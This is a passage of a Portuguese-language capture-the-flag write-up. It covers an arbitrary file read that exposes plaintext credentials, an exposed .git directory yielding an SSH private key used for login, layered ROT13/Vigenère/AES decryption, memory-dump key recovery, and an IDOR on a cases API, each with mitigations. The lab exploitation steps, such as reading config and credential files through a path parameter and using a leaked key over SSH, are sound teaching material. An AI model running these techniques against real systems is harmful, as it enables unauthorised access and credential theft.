→ descoberta de /dashboard/files
→ utilização do parâmetro path na página web
→ leitura de /var/www/data/logs/access.log
→ descoberta de /var/www/backups/config.bak
→ leitura de credenciais admin/operator
→ login no dashboard
→ leitura de ficheiros internos através do browser
→ descoberta de /opt/steel-mountain/flag.txt
→ leitura da flag pela página /dashboard/files
```

---

## 11. Vulnerabilidades identificadas

### 11.1. Exposição de rotas sensíveis no `robots.txt`

O ficheiro `robots.txt` revelou endpoints internos:

```text
/dashboard/files
/dashboard/maintenance
```

Embora o `robots.txt` não seja uma vulnerabilidade direta, pode ajudar atacantes a identificar áreas interessantes da aplicação.

---

### 11.2. Leitura arbitrária de ficheiros

O parâmetro `path` no endpoint `/dashboard/files` permitia ler ficheiros arbitrários do servidor:

```text
/dashboard/files?path=/var/www/backups/config.bak
```

Este comportamento permitiu aceder a ficheiros de configuração, logs, relatórios e à própria flag.

---

### 11.3. Armazenamento inseguro de credenciais

O ficheiro `config.bak` continha credenciais em texto claro:

```text
operator_user=operator
operator_pass=sm_oper8!
admin_user=admin
admin_pass=st33l_m0unt41n_2015
```

Credenciais não devem ser armazenadas em backups acessíveis pela aplicação web.

---

### 11.4. Falta de validação no parâmetro `path`

A aplicação permitia aceder a ficheiros fora da diretoria esperada, incluindo:

```text
/var/www/backups/config.bak
/opt/steel-mountain/flag.txt
```

Isto indica ausência de validação adequada no caminho fornecido pelo utilizador.

---

### 11.5. Falta de controlo de autorização sobre ficheiros sensíveis

Mesmo após autenticação, a aplicação não limitava devidamente que ficheiros podiam ser lidos pelo utilizador autenticado.

Um utilizador autenticado conseguia consultar ficheiros sensíveis do sistema através do browser, desde que soubesse o caminho.

---

## 12. Impacto

As vulnerabilidades identificadas permitiram:

- enumerar rotas internas da aplicação;
- ler ficheiros sensíveis do servidor;
- obter credenciais administrativas;
- autenticar no dashboard;
- descobrir a localização da flag;
- ler ficheiros fora da diretoria prevista pela aplicação.

Num ambiente real, este tipo de falha poderia permitir a exposição de credenciais, chaves privadas, configurações, código-fonte, dados internos e informação sensível da organização.

---

## 13. Recomendações de mitigação

### 13.1. Validar e restringir caminhos de ficheiros

O parâmetro `path` nunca deve aceitar caminhos absolutos fornecidos diretamente pelo utilizador.

Deve ser implementada uma allowlist de ficheiros permitidos ou o acesso deve ser restringido a uma diretoria específica.

Exemplo conceptual:

```text
Permitir apenas ficheiros dentro de /var/www/data/reports/
Bloquear caminhos absolutos
Bloquear sequências como ../
Normalizar o caminho antes de abrir ficheiros
```

---

### 13.2. Remover credenciais de ficheiros de backup

Ficheiros como `config.bak` não devem conter credenciais em texto claro.

As credenciais devem ser guardadas através de variáveis de ambiente ou gestores de secrets.

---

### 13.3. Proteger ficheiros de backup

Backups não devem estar acessíveis através da aplicação web.

Devem ser guardados fora do web root ou em sistemas próprios de backup com controlo de acesso adequado.

---

### 13.4. Evitar divulgar rotas sensíveis no `robots.txt`

Rotas internas ou administrativas não devem ser colocadas no `robots.txt` como mecanismo de proteção.

O controlo deve ser feito por autenticação e autorização, não por ocultação.

---

### 13.5. Aplicar controlo de autorização

Mesmo após autenticação, a aplicação deve validar se o utilizador tem permissão para ler determinado ficheiro.

Por exemplo, um utilizador autenticado não deve conseguir ler:

```text
/opt/steel-mountain/flag.txt
/etc/passwd
/var/www/backups/config.bak
```

---

### 13.6. Monitorizar acessos anómalos a ficheiros

Devem ser registados e monitorizados acessos a caminhos sensíveis ou anómalos, especialmente quando são usados parâmetros que apontam para ficheiros internos.

---

## 14. Conclusão

Neste desafio foi explorada uma vulnerabilidade de leitura arbitrária de ficheiros no endpoint:

```text
/dashboard/files?path=
```

Através desta falha, foi possível ler logs internos, descobrir a localização de um ficheiro de backup e extrair credenciais administrativas em texto claro.

Com essas credenciais, foi possível aceder ao dashboard e continuar a exploração pela própria interface web até identificar o caminho da flag:

```text
/opt/steel-mountain/flag.txt
```

Por fim, a flag foi obtida com sucesso através do browser:

```text
FLAG{ch04_20584aa252e05063da758c1952a313f8}
```

O desafio demonstra a importância de proteger ficheiros internos, evitar exposição de backups e validar corretamente qualquer caminho de ficheiro controlado pelo utilizador.

# CH05

## 1. Identificação do desafio

**Categoria:** Web — Git Forensics  
**Alvo:** `http://ch05-web`  
**Objetivo:** Identificar informação sensível deixada no servidor através de artefactos de desenvolvimento, nomeadamente um repositório Git exposto.

---

## 2. Reconhecimento inicial

Durante a análise inicial do website, foi consultado o ficheiro `robots.txt`, onde foi encontrada uma referência à diretoria `.git/`.

![Robots.txt](resources/2026-05-25-11-49-08.png)

Ao aceder manualmente ao caminho:

```text
http://ch05-web/.git/
```

foi possível confirmar que a diretoria `.git` estava publicamente acessível através do browser.

Esta exposição representa uma falha grave de configuração, pois a pasta `.git` contém metadados do repositório, histórico de commits, referências, objetos e, potencialmente, ficheiros sensíveis removidos ou esquecidos pelos programadores.

---

## 3. Enumeração da diretoria `.git`

Ao abrir:

```text
http://ch05-web/.git/
```

foi apresentado um índice com várias entradas típicas de um repositório Git:

```text
HEAD
config
description
index
objects/
refs/
logs/
hooks/
COMMIT_EDITMSG
```

A existência destes ficheiros confirmou que o servidor estava a expor o repositório Git da aplicação.

---

## 4. Extração do repositório

Para reconstruir o repositório localmente, foi utilizada uma ferramenta de extração de repositórios Git expostos, como `git-dumper`.

Comando utilizado:

```bash
git-dumper http://ch05-web/.git/ repo_ch05
```

Depois da extração, foi possível entrar na pasta reconstruída:

```bash
cd repo_ch05
```

E analisar o histórico:

```bash
git log
```

---

## 5. Análise do histórico Git

Ao consultar o histórico de commits, foi identificado um commit inicial com a seguinte informação:

```text
commit 036b06263d367e59b0457cf98b932fb933b74eba
Author: E Corp DevOps <devops@e-corp.com>
Date: Mon Apr 27 18:10:04 2026 +0000

initial deployment of corporate site
```

A mensagem do commit indicava que tinham sido adicionados os seguintes ficheiros:

```text
index.html
deploy_keys/backup_server.key
deploy_keys/README.md
```

O ficheiro mais relevante era:

```text
deploy_keys/backup_server.key
```

Este nome sugeria tratar-se de uma chave SSH privada utilizada para acesso a um servidor de backup.

---

## 6. Recuperação da chave SSH

Foi extraída a chave SSH privada a partir do repositório:

```bash
cat deploy_keys/backup_server.key
```

Ou, caso fosse necessário recuperar diretamente a partir do commit:

```bash
git show 036b06263d367e59b0457cf98b932fb933b74eba:deploy_keys/backup_server.key > ssh_key
```

De seguida, foram ajustadas as permissões da chave, uma vez que o SSH exige que chaves privadas tenham permissões restritas:

```bash
chmod 600 ssh_key
```

---

## 7. Tentativa de ligação SSH

A partir da informação recolhida no repositório, foi identificado o possível servidor de backup:

```text
ch05-backup
```

E o utilizador provável:

```text
backup
```

Foi inicialmente tentado o seguinte comando:

```bash
ssh backup@ch05-backup -k ../ssh_key
```

No entanto, este comando estava incorreto, pois a opção `-k` não é usada para indicar uma chave privada SSH.

A opção correta é:

```bash
-i
```

Comando corrigido:

```bash
ssh -i ../ssh_key backup@ch05-backup
```

ou, caso a chave esteja na pasta atual:

```bash
ssh -i ./ssh_key backup@ch05-backup
```

---

## 8. Erro encontrado

A resposta inicial foi:

```text
backup@ch05-backup: Permission denied (publickey).
```

Este erro pode indicar uma das seguintes situações:

- a chave não foi indicada corretamente;
- a chave não tinha permissões corretas;
- o utilizador usado não era o correto;
- a chave não corresponde ao utilizador `backup`;
- a chave foi mal copiada ou está incompleta.

Neste caso, foi identificado que o comando usado inicialmente continha um erro de sintaxe, porque foi utilizado `-k` em vez de `-i`.

---

## 9. Validação da chave

Para validar se o ficheiro era realmente uma chave privada SSH, pode ser usado:

```bash
head -5 ssh_key
```

O ficheiro deve começar com algo semelhante a:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
```

ou:

```text
-----BEGIN RSA PRIVATE KEY-----
```

Também é recomendado testar a ligação em modo verbose para perceber se a chave está a ser enviada e aceite pelo servidor:

```bash
ssh -vvv -i ssh_key backup@ch05-backup
```

Linhas importantes a procurar:

```text
Offering public key
Server accepts key
```

Se a chave for oferecida mas não aceite, o utilizador ou a chave podem estar incorretos.

---

## 10. Impacto da vulnerabilidade

A exposição pública da diretoria `.git` é uma vulnerabilidade crítica, porque permite a um atacante:

- reconstruir o código-fonte da aplicação;
- consultar o histórico de commits;
- recuperar ficheiros removidos;
- encontrar credenciais, tokens, chaves SSH ou passwords;
- descobrir endpoints internos;
- obter informação sobre infraestrutura;
- escalar acesso para outros sistemas.

Neste desafio, a exposição permitiu encontrar uma chave SSH associada a um servidor de backup, o que representa um risco elevado de acesso não autorizado.

---

## 11. Recomendações de mitigação

Para prevenir este tipo de vulnerabilidade, devem ser aplicadas as seguintes medidas:

### 11.1. Bloquear acesso à diretoria `.git` no servidor web

Exemplo em Apache:

```apache
<DirectoryMatch "^/.*/\.git/">
    Require all denied
</DirectoryMatch>
```

Exemplo em Nginx:

```nginx
location ~ /\.git {
    deny all;
}
```

### 11.2. Nunca guardar chaves privadas no repositório

Chaves SSH, tokens e secrets devem ser guardados em sistemas próprios, como:

```text
Vault
AWS Secrets Manager
GitHub Secrets
GitLab CI/CD Variables
.env fora do repositório
```

### 11.3. Adicionar ficheiros sensíveis ao `.gitignore`

Exemplo:

```gitignore
*.key
*.pem
.env
deploy_keys/
```

### 11.4. Rodar imediatamente as credenciais expostas

Como a chave SSH foi exposta, deve ser considerada comprometida. Deve ser removida do servidor e substituída por uma nova.

### 11.5. Remover secrets do histórico Git

Mesmo que um ficheiro seja apagado, ele continua presente no histórico. Ferramentas como `git filter-repo` ou `BFG Repo-Cleaner` podem ser usadas para limpar o histórico.

---

## 12. Conclusão

Neste desafio foi identificada uma diretoria `.git` exposta no servidor web. Através dessa exposição, foi possível reconstruir o repositório Git da aplicação e analisar o histórico de commits.

Durante a análise, foi encontrado um ficheiro sensível chamado:

```text
deploy_keys/backup_server.key
```

Este ficheiro continha uma chave SSH privada potencialmente utilizada para aceder ao servidor de backup `ch05-backup`.

A vulnerabilidade demonstra o risco de deixar artefactos de desenvolvimento expostos em produção. A exposição de um repositório Git pode permitir a recuperação de código-fonte, credenciais e chaves privadas, podendo levar a comprometimento total da aplicação ou de sistemas internos associados.

---

## 13. Comandos principais utilizados

```bash
# Descarregar o repositório Git exposto
git-dumper http://ch05-web/.git/ repo_ch05

# Entrar na pasta reconstruída
cd repo_ch05

# Ver histórico de commits
git log

# Ver detalhes de um commit
git show 036b06263d367e59b0457cf98b932fb933b74eba

# Extrair chave SSH do commit
git show 036b06263d367e59b0457cf98b932fb933b74eba:deploy_keys/backup_server.key > ssh_key

# Corrigir permissões da chave
chmod 600 ssh_key

# Ligar via SSH com a chave privada
ssh -i ssh_key backup@ch05-backup

# Debug da ligação SSH
ssh -vvv -i ssh_key backup@ch05-backup
```


# CH06 

## 1. Identificação do desafio

**Categoria:** Crypto — Multi-layer Decryption  
**Alvo:** `http://assets-server/e826eaf7-e53e-6148-7b64-784cee195661/`  
**Objetivo:** Desencriptar três entradas de diário em sequência, utilizando a informação encontrada em cada etapa para avançar para a seguinte, até obter a flag final.

---

## 2. Contexto inicial

Ao aceder ao endereço fornecido pelo desafio, foi apresentada uma página intitulada **Elliot's Journal**, com a indicação de que existiam três entradas de diário encriptadas que deveriam ser desencriptadas pela ordem correta.

Os ficheiros disponíveis eram:

```text
journal_entry_1.txt
journal_entry_2.txt
journal_entry_3.enc
README.txt
```

A própria página indicava que as entradas deveriam ser tratadas de forma sequencial, ou seja, a primeira entrada fornecia uma pista para a segunda, e a segunda fornecia uma pista para a terceira.

---

## 3. Análise da primeira entrada

O primeiro ficheiro analisado foi:

```text
journal_entry_1.txt
```

O conteúdo encontrava-se cifrado e apresentava texto semelhante a:

```text
Qnl 47. Gur ebhgvar pbagvahrf. Jnxr hc. Oernxsnfg jvgu zbz. Ernq. Jevgr. Ohg V sbhaq fbzrguvat. N xrl uvqqra va gur frpbaq ragel. Gur fuvsg vf 'EBOBG'.
```

Pelo padrão do texto, foi identificada a utilização de **ROT13**, uma cifra de substituição simples em que cada letra é deslocada 13 posições no alfabeto.

---

## 4. Desencriptação da primeira entrada

A desencriptação foi realizada no **CyberChef**, utilizando a operação:

```text
ROT13
```

O resultado obtido foi:

```text
Day 47. The routine continues. Wake up. Breakfast with mom. Read. Write. But I found something. A key hidden in the second entry. The shift is 'ROBOT'.
```

Esta mensagem revelou duas informações importantes:

```text
A próxima pista está na segunda entrada.
A chave/shift a usar é ROBOT.
```

---

## 5. Análise da segunda entrada

O segundo ficheiro analisado foi:

```text
journal_entry_2.txt
```

O conteúdo apresentava texto cifrado, mas já não correspondia a ROT13. Como a primeira entrada indicava a palavra-chave:

```text
ROBOT
```

foi testada uma cifra que utiliza chave textual para deslocamentos: **Vigenère**.

---

## 6. Desencriptação da segunda entrada

No **CyberChef**, foi utilizada a operação:

```text
Vigenère Decode
```

Com a chave:

```text
ROBOT
```

A desencriptação revelou a seguinte mensagem:

```text
I remember now. The AES key. Take my favorite quote: 'control is an illusion'. Remove the spaces and use the first 16 characters. That is the key. The IV is all zeros.
```

Esta mensagem forneceu a informação necessária para a terceira etapa:

```text
Algoritmo: AES
Frase base: control is an illusion
Remover espaços
Usar os primeiros 16 caracteres como chave
IV composto apenas por zeros
```

---

## 7. Construção da chave AES

A frase indicada foi:

```text
control is an illusion
```

Removendo os espaços:

```text
controlisanillusion
```

Os primeiros 16 caracteres são:

```text
controlisanillus
```

Assim, a chave AES utilizada foi:

```text
controlisanillus
```

Como a chave tem 16 bytes, corresponde a **AES-128**.

Para utilização em formato hexadecimal, a chave foi convertida para:

```text
636f6e74726f6c6973616e696c6c7573
```

O IV indicado era composto apenas por zeros. Como o AES utiliza blocos de 16 bytes, em hexadecimal o IV foi definido como:

```text
00000000000000000000000000000000
```

---

## 8. Análise da terceira entrada

O terceiro ficheiro era:

```text
journal_entry_3.enc
```

Ao contrário das duas primeiras entradas, este ficheiro era binário. Inicialmente, ao tentar copiar o conteúdo diretamente do browser ou abrir o ficheiro como texto, o conteúdo aparecia corrompido, com caracteres inválidos.

Foi então concluído que o ficheiro não deveria ser copiado como texto. A forma correta era descarregar ou abrir o ficheiro diretamente no CyberChef como input binário.

---

## 9. Desencriptação da terceira entrada

No **CyberChef**, foi utilizado o ficheiro `journal_entry_3.enc` diretamente como input, recorrendo à opção de selecionar ficheiro no painel de entrada.

A operação utilizada foi:

```text
AES Decrypt
```

Com os seguintes parâmetros:

```text
Mode: CBC
Input: Raw
Output: Raw
Key format: HEX
Key: 636f6e74726f6c6973616e696c6c7573
IV format: HEX
IV: 00000000000000000000000000000000
```

A escolha de carregar o ficheiro diretamente no CyberChef foi essencial, pois copiar dados binários como texto altera os bytes e impede a desencriptação correta.

---

## 10. Obtenção da flag

Após carregar corretamente o ficheiro binário e aplicar a desencriptação AES com os parâmetros corretos, foi obtida a flag:

```text
FLAG{ch06_4d76f80302d992e8e8ba2ecb011202a0}
```

---

## 11. Cadeia de desencriptação

A resolução completa seguiu a seguinte sequência:

```text
journal_entry_1.txt
→ ROT13
→ pista: chave ROBOT

journal_entry_2.txt
→ Vigenère Decode com chave ROBOT
→ pista: AES key derivada de "control is an illusion"
→ chave: controlisanillus
→ IV: zeros

journal_entry_3.enc
→ AES-128-CBC
→ key: controlisanillus
→ IV: 0000000000000000 / 16 bytes zero
→ flag final
```

---

## 12. Ferramentas utilizadas

### CyberChef

Foi utilizado para:

```text
ROT13
Vigenère Decode
AES Decrypt
Conversão de texto para hexadecimal
Carregamento do ficheiro binário journal_entry_3.enc
```

### Browser

Foi utilizado para:

```text
Aceder à página do desafio
Visualizar os ficheiros disponíveis
Abrir as entradas journal_entry_1.txt e journal_entry_2.txt
Identificar que journal_entry_3.enc era binário
```

---

## 13. Conceitos aplicados

### ROT13

ROT13 é uma cifra de substituição simples que desloca cada letra 13 posições no alfabeto. Como o alfabeto tem 26 letras, aplicar ROT13 duas vezes recupera o texto original.

### Vigenère

A cifra de Vigenère utiliza uma palavra-chave para aplicar deslocamentos variáveis às letras do texto. Neste desafio, a chave usada foi:

```text
ROBOT
```

### AES-CBC

AES é um algoritmo de cifra simétrica por blocos. No modo CBC, além da chave, é necessário um IV de 16 bytes. Neste caso:

```text
Key: controlisanillus
IV: 16 bytes zero
```

Como a chave tinha 16 bytes, foi usado AES-128.

---

## 14. Dificuldades encontradas

A principal dificuldade ocorreu na terceira etapa, porque o ficheiro `journal_entry_3.enc` era binário.

Ao copiar o conteúdo diretamente do browser ou ao abrir o ficheiro como texto, os bytes ficavam corrompidos e a desencriptação falhava.

A solução foi usar a opção de carregar o ficheiro diretamente no CyberChef como input binário, preservando os bytes originais.

---

## 15. Conclusão

Neste desafio foi necessário resolver uma cadeia de desencriptação em múltiplas camadas. A primeira entrada foi desencriptada com ROT13 e revelou a chave `ROBOT`. A segunda entrada foi desencriptada com Vigenère usando essa chave, revelando os parâmetros necessários para desencriptar a terceira entrada com AES.

A última etapa exigiu cuidado adicional, pois o ficheiro era binário e teve de ser carregado diretamente no CyberChef para preservar os bytes originais.

A flag final obtida foi:

```text
FLAG{ch06_4d76f80302d992e8e8ba2ecb011202a0}
```
![FLAG](resources/2026-05-25-12-52-11.png)

# CH10

## 1. Identificação do desafio

**Categoria:** Forensics — Memory Analysis  
**Alvo:** `http://assets-server/444d61a7-43d5-eaf1-44eb-bd2a3fc18e2d/`  
**Objetivo:** Analisar um dump de memória para recuperar uma chave de encriptação e utilizá-la para desencriptar uma partição cifrada.

---

## 2. Contexto inicial

Ao aceder à página do desafio, foi apresentada a evidência relacionada com o portátil de Darlene.

A descrição indicava que o disco estava encriptado, mas que tinha sido capturado um dump de memória antes de a máquina ser desligada. A pista principal era que a chave de encriptação poderia ainda estar presente na RAM.

Os ficheiros disponíveis eram:

```text
laptop_memdump.raw
encrypted_drive.enc
README.txt
```

O ficheiro `README.txt` indicava também as ferramentas esperadas para a análise:

```text
strings
grep
xxd
openssl
python3
```

---

## 3. Download e preparação dos ficheiros

Foram descarregados os ficheiros principais para a máquina Kali:

```bash
wget http://assets-server/444d61a7-43d5-eaf1-44eb-bd2a3fc18e2d/laptop_memdump.raw
wget http://assets-server/444d61a7-43d5-eaf1-44eb-bd2a3fc18e2d/encrypted_drive.enc
```

O ficheiro mais importante para a primeira fase era:

```text
laptop_memdump.raw
```

Este ficheiro representava um excerto da memória RAM capturada antes de o sistema ser desligado.

---

## 4. Análise do dump de memória

Como a pista indicava que a chave poderia estar em RAM, foi utilizada a ferramenta `strings` para extrair texto legível do dump de memória.

O primeiro comando utilizado foi:

```bash
strings laptop_memdump.raw | grep -iE "key|pass|password|encrypt|decrypt|aes|iv|secret|drive|mount|openssl"
```

Este comando procurou strings relacionadas com encriptação, passwords, chaves, IVs e termos associados a discos cifrados.

---

## 5. Resultado da análise de strings

O resultado revelou várias strings, algumas aparentando ser valores falsos ou distrações:

```text
PASSWORD=not_this_one
SECRET=decoy_value
ENCRYPTION_PASS=wrong_passphrase_123
LUKS_PASSPHRASE=tryharder
FDE_KEY=this_is_not_it_either
VERACRYPT_PASS=mount_point_alpha
MASTER_PASSWORD=lastpass_backup
```

No entanto, uma string destacou-se como a mais provável:

```text
DARLENE_ENCRYPTION_KEY=D4rl3n3_fsociety!
```

Esta string estava diretamente associada ao nome da suspeita e ao conceito de chave de encriptação, tornando-a a candidata mais provável para desencriptar o ficheiro `encrypted_drive.enc`.

A chave identificada foi:

```text
D4rl3n3_fsociety!
```

---

## 6. Interpretação da evidência

A presença de várias strings falsas indicava que o desafio incluía **decoys**, ou seja, valores que pareciam credenciais ou chaves, mas que não eram os corretos.

A string relevante era a que combinava:

```text
DARLENE
ENCRYPTION_KEY
```

Assim, concluiu-se que o valor correto a testar era:

```text
D4rl3n3_fsociety!
```

---

## 7. Desencriptação do ficheiro cifrado

Com a chave encontrada no dump de memória, foi tentada a desencriptação do ficheiro:

```text
encrypted_drive.enc
```

Foi utilizado `openssl`, com AES-256-CBC e PBKDF2:

```bash
openssl enc -d -aes-256-cbc -pbkdf2 \
-in encrypted_drive.enc \
-out decrypted_drive.bin \
-pass pass:'D4rl3n3_fsociety!'
```

Após a execução do comando, foi criado o ficheiro:

```text
decrypted_drive.bin
```

---

## 8. Validação do ficheiro desencriptado

Para confirmar se a desencriptação tinha sido bem-sucedida, foi usado o comando:

```bash
file decrypted_drive.bin
```

O resultado indicou que o ficheiro era texto ASCII:

```text
decrypted_drive.bin: ASCII text
```

De seguida, foi usado:

```bash
strings decrypted_drive.bin
```

O conteúdo revelado foi:

```text
=== Darlene's Encrypted Partition ===
fsociety operations log:
- 2015-05-09: Stage 1 execution confirmed
- 2015-05-10: E Corp financial data encrypted
- 2015-05-11: All traces cleaned
Backup decryption key: FLAG{ch10_ef2579f5b95280ee5fa41b8f218695fd}
This data is classified. If you're reading this,
either you're fsociety, or we're already done.
```

---

## 9. Obtenção da flag

A flag encontrava-se dentro do conteúdo desencriptado:

```text
FLAG{ch10_ef2579f5b95280ee5fa41b8f218695fd}
```

---

## 10. Cadeia de exploração/análise

A resolução completa seguiu a seguinte sequência:

```text
Página do desafio
→ download de laptop_memdump.raw e encrypted_drive.enc
→ análise do dump de memória com strings
→ filtragem por termos relacionados com encriptação
→ descoberta de DARLENE_ENCRYPTION_KEY
→ utilização da chave com OpenSSL
→ desencriptação de encrypted_drive.enc
→ leitura de decrypted_drive.bin
→ obtenção da flag
```

---

## 11. Ferramentas utilizadas

### Browser

Utilizado para aceder à página do desafio e identificar os ficheiros disponíveis.

### wget

Utilizado para descarregar os ficheiros da evidência.

### strings

Utilizado para extrair strings legíveis do dump de memória.

### grep

Utilizado para filtrar strings relevantes, como:

```text
key
password
encrypt
aes
secret
drive
openssl
```

### openssl

Utilizado para desencriptar o ficheiro `encrypted_drive.enc`.

### file

Utilizado para identificar o tipo do ficheiro desencriptado.

---

## 12. Conceitos aplicados

### Memory Analysis

A análise de memória consiste em procurar artefactos deixados em RAM, como passwords, chaves de encriptação, tokens, comandos, processos ou dados sensíveis.

Neste desafio, a chave de encriptação ainda estava presente no dump de memória.

### Strings em dumps de memória

A ferramenta `strings` permite extrair sequências de caracteres legíveis de ficheiros binários. Em dumps de memória, isto pode revelar credenciais, variáveis de ambiente, comandos executados e outros dados sensíveis.

### Encriptação simétrica

O ficheiro `encrypted_drive.enc` foi desencriptado com uma chave encontrada em memória. Isto representa um cenário típico de encriptação simétrica, onde a mesma chave ou passphrase é usada para cifrar e decifrar dados.

### OpenSSL

O OpenSSL foi usado para executar a desencriptação com AES-256-CBC e PBKDF2, usando a passphrase descoberta no dump.

---

## 13. Dificuldades encontradas

A principal dificuldade foi distinguir entre a chave real e os valores falsos encontrados no dump de memória.

Foram encontrados vários valores que pareciam credenciais ou chaves, mas que estavam claramente marcados como distrações:

```text
not_this_one
decoy_value
wrong_passphrase_123
tryharder
this_is_not_it_either
```

A string correta destacava-se por estar associada diretamente ao nome da suspeita e ao termo `ENCRYPTION_KEY`:

```text
DARLENE_ENCRYPTION_KEY=D4rl3n3_fsociety!
```

---

## 14. Impacto num cenário real

Num ambiente real, este tipo de exposição teria impacto elevado. Se um atacante obtiver um dump de memória de uma máquina cifrada enquanto esta ainda está ligada, pode ser possível recuperar:

- chaves de encriptação;
- passwords;
- tokens de sessão;
- credenciais de aplicações;
- passphrases de discos cifrados;
- informação sensível temporariamente carregada em RAM.

Isto demonstra que a encriptação de disco protege dados em repouso, mas não impede necessariamente a recuperação de chaves se a máquina estiver ligada e a memória for capturada.

---

## 15. Recomendações de mitigação

### 15.1. Proteger a memória em sistemas sensíveis

Sistemas com dados críticos devem minimizar a exposição de chaves em memória e utilizar mecanismos de proteção adequados.

### 15.2. Desligar corretamente sistemas comprometidos

Em incidentes reais, a aquisição de memória deve ser tratada com cuidado. Se um atacante tiver acesso físico ou privilégios elevados, poderá tentar capturar RAM para obter chaves.

### 15.3. Utilizar mecanismos de proteção de chaves

Sempre que possível, devem ser usados módulos de segurança, TPMs, HSMs ou mecanismos que reduzam a exposição de chaves diretamente em memória.

### 15.4. Evitar variáveis de ambiente ou strings previsíveis para secrets

Chaves e passwords não devem estar guardadas em variáveis facilmente identificáveis, como:

```text
ENCRYPTION_KEY
PASSWORD
SECRET
```

### 15.5. Monitorizar e proteger dumps de memória

Dumps de memória devem ser tratados como dados altamente sensíveis, pois podem conter credenciais e chaves ativas.

---

## 16. Conclusão

Neste desafio foi realizada uma análise forense de memória para recuperar uma chave de encriptação. Através da ferramenta `strings` e de filtros com `grep`, foi identificada a string:

```text
DARLENE_ENCRYPTION_KEY=D4rl3n3_fsociety!
```

Essa chave foi usada com `openssl` para desencriptar o ficheiro `encrypted_drive.enc`, resultando num ficheiro de texto contendo a flag.

A flag obtida foi:

```text
FLAG{ch10_ef2579f5b95280ee5fa41b8f218695fd}
```

O desafio demonstra a importância da análise de memória em investigação forense e mostra que chaves de encriptação podem permanecer em RAM mesmo quando os dados em disco estão protegidos.

# CH08

## 1. Identificação do desafio

**Categoria:** Web — Broken Access Control  
**Alvo:** `http://ch08-web`  
**Objetivo:** Explorar uma falha de controlo de acesso na API da aplicação, acedendo a casos atribuídos a outro utilizador através da manipulação do parâmetro `user_id`.

---

## 2. Contexto inicial

Ao aceder ao dashboard da aplicação, foi apresentado o perfil do agente autenticado.

A aplicação mostrava os seguintes dados:

```text
USER ID: 2
USERNAME: agent_jones
FULL NAME: Agent Michael Jones
ROLE: Special Agent
DIVISION: Cyber Division
CLEARANCE: SECRET
```

No próprio dashboard existia também uma secção com endpoints da API disponíveis:

```text
GET /api/profile — Your agent profile (JSON)
GET /api/cases?user_id=2 — Your assigned cases (JSON)
```

A hint do desafio indicava:

```text
Check /api/profile for your user ID.
Try other IDs in the /api/cases endpoint.
```

Isto sugeria que a aplicação podia estar vulnerável a **Broken Access Control**, permitindo consultar casos de outros utilizadores através da alteração manual do `user_id`.

---

## 3. Verificação do perfil autenticado

Foi observado que o utilizador autenticado tinha o seguinte identificador:

```text
user_id = 2
```

Este ID aparecia no dashboard e era utilizado pela API para consultar os casos atribuídos ao agente:

```text
/api/cases?user_id=2
```

Ao aceder a este endpoint, a aplicação apresentava apenas os casos associados ao utilizador autenticado.

Entre os casos visíveis para o utilizador `agent_jones` estavam:

```text
FBI-2015-NYC-0145 — Steel Mountain Physical Security Audit
FBI-2015-NYC-0158 — AllSafe Cybersecurity — Contractor Review
```

Ambos estavam classificados como `UNCLASSIFIED`.

---

## 4. Identificação da vulnerabilidade

O endpoint `/api/cases` recebia o parâmetro `user_id` diretamente na query string:

```text
/api/cases?user_id=2
```

A aplicação deveria garantir que o utilizador autenticado apenas conseguia consultar os seus próprios casos. No entanto, a hint indicava que seria possível alterar manualmente o valor do parâmetro.

Foi então testado outro ID de utilizador, alterando o valor de `user_id` para `1` diretamente no URL:

```text
http://ch08-web/api/cases?user_id=1
```

A aplicação respondeu com dados de casos atribuídos a outro utilizador, confirmando uma falha de autorização.

---

## 5. Exploração da falha

Ao aceder ao endpoint:

```text
http://ch08-web/api/cases?user_id=1
```

foi possível visualizar informação que não pertencia ao utilizador autenticado.

A resposta JSON continha vários casos, incluindo informação classificada como `TOP SECRET`.

Um dos casos revelados foi:

```text
case_id: FBI-2015-NYC-0091
classification: TOP SECRET
status: ACTIVE
title: Operation Berenstain — fsociety Surveillance
```

O campo `summary` apresentava informação sensível:

```text
Deep-cover surveillance operation targeting the hacktivist group known as fsociety.
Primary subject: unknown male, alias 'Elliot'.
Evidence of ties to E Corp cyberattack planning.
Case encryption key: FLAG{ch08_0feb92eb73f3052d6be654693acc2ba5}
```

Assim, a flag foi exposta diretamente através da API.

---

## 6. Flag obtida

A flag encontrada foi:

```text
FLAG{ch08_0feb92eb73f3052d6be654693acc2ba5}
```

---

## 7. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Acesso ao dashboard
→ identificação do user_id do utilizador autenticado
→ observação do endpoint /api/cases?user_id=2
→ alteração manual do parâmetro para user_id=1
→ acesso a casos de outro utilizador
→ leitura de caso TOP SECRET
→ obtenção da flag no campo summary
```

---

## 8. Vulnerabilidade identificada

A vulnerabilidade explorada foi **Broken Access Control**, mais especificamente um caso de **IDOR** (*Insecure Direct Object Reference*).

O problema ocorreu porque a aplicação confiava no parâmetro `user_id` fornecido pelo cliente para decidir que dados devolver.

O comportamento vulnerável pode ser resumido assim:

```text
Utilizador autenticado: user_id=2
Pedido legítimo: /api/cases?user_id=2
Pedido manipulado: /api/cases?user_id=1
Resultado: acesso indevido a dados de outro utilizador
```

A aplicação deveria ignorar o `user_id` fornecido pelo cliente ou validar se o utilizador autenticado tinha permissão para consultar aquele ID.

---

## 9. Impacto

A falha permitiu:

- consultar casos atribuídos a outros agentes;
- aceder a informação classificada;
- visualizar dados `SECRET` e `TOP SECRET`;
- obter uma chave/flag presente no resumo de um caso;
- contornar o controlo de acesso apenas alterando um parâmetro no URL.

Num ambiente real, esta vulnerabilidade poderia expor dados confidenciais, informação governamental, dados internos, investigações sensíveis ou informação pessoal de outros utilizadores.

---

## 10. Recomendações de mitigação

### 10.1. Não confiar em IDs enviados pelo cliente

A aplicação não deve confiar diretamente no parâmetro `user_id` enviado na query string para decidir que dados mostrar.

Em vez disso, deve obter o ID do utilizador autenticado a partir da sessão ou do token de autenticação.

Exemplo conceptual:

```text
Errado:
GET /api/cases?user_id=2

Correto:
GET /api/cases
```

Neste modelo, o backend identifica automaticamente o utilizador autenticado e devolve apenas os seus casos.

---

### 10.2. Implementar verificações de autorização no backend

Antes de devolver qualquer caso, o servidor deve verificar se o utilizador autenticado tem permissão para aceder àquele recurso.

A validação deve ser feita do lado do servidor, nunca apenas no frontend.

---

### 10.3. Aplicar controlo de acesso por função e clearance

Como a aplicação usa conceitos como `ROLE`, `DIVISION` e `CLEARANCE`, o backend deve validar:

```text
user_id autenticado
role do utilizador
divisão do utilizador
nível de clearance
estado/classificação do caso
```

